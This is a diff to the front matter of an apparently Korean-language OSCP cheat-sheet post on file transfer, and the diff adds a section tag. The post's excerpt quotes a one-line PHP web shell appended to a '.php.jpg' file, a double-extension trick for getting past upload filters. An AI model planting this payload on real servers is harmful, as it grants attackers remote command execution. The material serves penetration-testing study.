@@ -3,6 +3,7 @@ slug: "file-transfer"
 title: "file_transfer"
 date: 2026-07-14
 category: "치트시트"
+section: "OSCP"
 tags: []
 excerpt: "php 일시에 다음과 같이 넣음 ~~~bash echo '<?php system($_GET[\"cmd\"]); ?>' >> {파일명}.php.jpg ~~~ --- ### 특수문자…"
 readingTime: 1
